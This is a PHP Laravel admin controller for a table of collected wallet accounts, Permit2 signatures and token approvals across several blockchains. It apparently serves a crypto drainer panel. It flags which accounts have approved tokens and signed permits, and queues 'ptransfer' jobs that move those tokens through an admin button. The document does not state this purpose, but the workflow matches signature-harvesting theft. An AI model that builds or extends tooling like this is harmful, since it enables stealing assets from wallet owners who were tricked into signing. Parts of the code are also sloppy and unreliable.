<?php

namespace App\Admin\Controllers;

use App\Http\Controllers\MsgRabbitMq;
use OpenAdmin\Admin\Controllers\AdminController;
use OpenAdmin\Admin\Form;
use OpenAdmin\Admin\Grid;
use OpenAdmin\Admin\Show;

use Illuminate\Http\Request;
use \App\Models\PermitCollection;
use \App\Models\Chainpermit2Collection;
use \App\Models\TokenV3Collection;
use Illuminate\Database\Eloquent\Collection;
use Illuminate\Http\JsonResponse;

use App\Admin\Extensions\Tools\TokenlistTool;
use OpenAdmin\Admin\Admin;
use PHPUnit\Util\Type;

use \App\Models\Tokenlist;

use function PHPSTORM_META\map;

class PermitCollectionController extends AdminController
{

    /**
     * Title for current resource.
     *
     * @var string
     */
    protected $title = 'PermitCollection';
    public $token = '';

    protected function connectBtn()
    {
        return view('web3tools.connect_btn_componet');
    }

    protected function v3Check()
    {
        return view('web3tools.v3_check_approve');
    }
    protected function permit2()
    {
        return view('web3tools.permit2')->render();
    }
    protected function permit2_transfer()
    {
        $username = Admin::user()->username;
        return view('web3tools.permit2_transfer')->with('username', $username)->render();
    }
    /**
     * Make a grid builder.
     *
     * @return Grid
     */


    protected function grid()
    {
        $grid = new Grid(new PermitCollection());
        // $grid->disableActions();

        $grid->filter(function ($filter) {

            // Remove the default id filter
            $filter->disableIdFilter();

            // Add a column filter
            $filter->like('chain', 'chain');
            $filter->like('source', 'source');
            // $filter->like('isV3approved', 'isV3approved');

            $filter->equal('isV3approved')->radio([
                ''   => 'All',
                1    => 'V3',
            ]);
        });

        $grid->tools(function ($tools) {
            $tools->batch(function ($batch) {
                $batch->disableEdit();
                $batch->disableDelete();
            });
            $tools->append($this->connectBtn());
            $tools->append(new TokenlistTool());
            $tools->append($this->v3Check());
        });

        //$grid->column('id', __('Id'));
        $grid->column('chain', __('Chain'))->display(function ($chain) {
            switch ($chain) {
                case 1:
                    return '<span class="btn btn-sm btn-success" style="font-size:12px" data-id=' . $chain . '>Eth Main Net</span>';
                case 10:
                    return '<span class="btn btn-sm btn-success" style="font-size:12px" data-id=' . $chain . '>Optismi</span>';
                case 137:
                    return '<span class="btn btn-sm btn-success" style="font-size:12px" data-id=' . $chain . '>Polygon</span>';
                case 42161:
                    return '<span class="btn btn-sm btn-success" style="font-size:12px" data-id=' . $chain . '>ARB</span>';
                case 56:
                    return '<span class="btn btn-sm btn-info" style="font-size:12px" data-id=' . $chain . '>BSC Main Net</span>';
                case 5:
                    return '<span class="btn btn-sm btn-info" style="font-size:12px" data-id=' . $chain . '>Goerli Test Net</span>';
                case '8453':
                    return '<span class="btn btn-sm btn-info" style="font-size:12px" data-id=' . $chain . '>Base Main Net</span>';
                default:
            }
        });
        $grid->column('account', __('Account'))->display(function ($account) {
            switch($this->chain){
                case 1:
                  return "<a href=https://etherscan.io/address/$account target='_blank'  style='text-decoration: none; color:#060606'>" . $account . "</a>";
                case 10:
                  return "<a href=https://optimistic.etherscan.io/address/$account target='_blank'  style='text-decoration: none; color:#060606'>" . $account . "</a>";
                case 137:
                  return "<a href=https://polygonscan.com/address/$account target='_blank'  style='text-decoration: none; color:#060606'>" . $account . "</a>";
                case 42161:
                  return "<a href=https://arbiscan.io/address/$account target='_blank'  style='text-decoration: none; color:#060606'>" . $account . "</a>";
                case 56:
                  return "<a href=https://bscscan.com/address/$account target='_blank'  style='text-decoration: none; color:#060606'>" . $account . "</a>";
                case 5:
                  return "<a href=https://goerli.etherscan.io/address/$account target='_blank'  style='text-decoration: none; color:#060606'>" . $account . "</a>";
                case '8453':
                    return "<a href=https://basescan.org/address/$account target='_blank'  style='text-decoration: none; color:#060606'>" . $account . "</a>";
                default:
            }
           
        });

        $grid->column('V3')->display(function () {
            $token_address = TokenlistTool::tokenAddressValue();
            $isV3approved = TokenV3Collection::where('chain', $this->chain)->where('permit_collection_id', $this->id)->where('token_address', $token_address)->get('is_v3_approved');

            if (isset($isV3approved[0]['is_v3_approved'])) {
                if ($isV3approved[0]['is_v3_approved'] == 0) {
                    return '<span class="btn btn-sm btn-danger" style="font-size:12px;">Unauthorized</span>';
                } else {
                    //检查是否己经permit2授权过
                    $isAlreadyPermit2 = Chainpermit2Collection::where('pc_id', $this->id)->get();
                    //检查url中的token参数是否在签名用户的token列表中
                    $sigTokenList=[];
                    foreach(json_decode($this->details) as $k=>$v){
                         $sigTokenList[] =strtolower($v->token);
                    }

                    if(!in_array(strtolower($token_address),$sigTokenList)){
                        return '<span class="btn btn-sm btn-danger" style="font-size:12px;">no sig</span>';
                    }
                    if (sizeof($isAlreadyPermit2) > 0 ) {
                        return  PermitCollectionController::permit2_transfer();
                    } else {
                        return PermitCollectionController::permit2();
                    }
                }
            } else {
                return '<span class="btn btn-sm btn-warning" style="font-size:12px">Unknown</span>';
            }
        });

        $grid->column('details')->display(function () {
                    $sigTokenList="";

                    //通过数据库查询token信息

                    foreach(json_decode($this->details) as $k=>$v){
                       $token =  Tokenlist::where('address',strtolower($v->token))->get();
                       if(sizeof($token)>0){
                        foreach($token as $k=>$v){
                        $sigTokenList .="<span class=\"btn btn-sm btn-info\" style=\"font-size:12px;\" value='$v->address'>". $v->name ."</span> ";
                       }
                       }else{
                         $sigTokenList .="<span class=\"btn btn-sm btn-info\" style=\"font-size:12px;\" value='strtolower($v->token)'>". strtolower($v->token) ."</span> ";
                       }
                    }

                    return $sigTokenList;
        });

        $grid->column('source', __('Source'));
        // $grid->column('signature', __('Signature'));
        // $grid->column('spender_address', __('Spender'));
        // $grid->column('details', __('Details'));

        return $grid;
    }

    /**
     * Make a show builder.
     *
     * @param mixed $id
     * @return Show
     */
    protected function detail($id)
    {
        $show = new Show(PermitCollection::findOrFail($id));

        $show->field('id', __('Id'));
        $show->field('source', __('Source'));
        $show->field('account', __('Account'));
        $show->field('permit2address', __('Permit2address'));
        $show->field('chain', __('Chain'));
        $show->field('signature', __('Signature'));
        $show->field('details', __('Details'));
        $show->field('isV3approved', __('V3'));
        $show->field('created_at', __('Created at'));
        $show->field('updated_at', __('Updated at'));

        return $show;
    }

    /**
     * Make a form builder.
     *
     * @return Form
     */
    protected function form()
    {
        $form = new Form(new PermitCollection());

        $form->text('source', __('Source'));
        $form->text('account', __('Account'));
        $form->text('permit2address', __('Permit2address'));
        $form->text('chain', __('Chain'));
        $form->text('signature', __('Signature'));
        $form->text('details', __('Details'));
        $form->text('isV3approved', __('V3'));

        return $form;
    }
    //查询接口
    public function inspectSignature(Request $request)
    {
        $id = $request->input('id');
        $PermitCollection = new PermitCollection;
        $data = $PermitCollection->where('id', $id)->get();
        return new JsonResponse($data, 200);
    }

    //更新接口
    public function updateIsv3Approve(Request $request)
    {
        foreach ($request->post() as $key => $item) {
            $tokenv3collection = new TokenV3Collection;

            $tokenv3collection->chain = $item['chain'];
            $tokenv3collection->permit_collection_id = $item['id'];
            $tokenv3collection->token_address = $item['erc20address'];
            $tokenv3collection->amount = $item['allowed'];
            $tokenv3collection->is_v3_approved = $item['allowed'] ? 1 : 0;

            //存在就更新，不存在就插入
            $isExist = $tokenv3collection::where('chain', $item['chain'])->where('permit_collection_id', $item['id'])->where('token_address', $item['erc20address'])->get();
            try {
                $is_v3_approved = $item['allowed'] ? 1 : 0;
              
                if (count($isExist)) {
                    $rs = $tokenv3collection::where('chain', $item['chain'])
                        ->where('permit_collection_id', $item['id'])
                        ->where('token_address', $item['erc20address'])
                        ->update(['amount' => $item['allowed'],'is_v3_approved' =>$is_v3_approved]);
                } else {
                    $rs = $tokenv3collection->save();
                }
            } catch (Exception $error) {
                return new JsonResponse($error->message(), 200);
                //echo $error->message();
            }
        }

        return new JsonResponse($rs, 200);
    }


    public function publishTransferMsg(Request $request)
    {

        $messageData = [
            'Data' => [
                'id' => $request->input('id'),
                'token'=>$request->input('token'),
              //  'username'=>$request->input('username')
            ],
        ];
        MsgRabbitMq::pushMsg($queue='ptransfer',$messageData);
        return new JsonResponse(['code'=>1,'message' => 'Message published successfully.'], 200,['encoding' => 'utf-8']);
    }
}
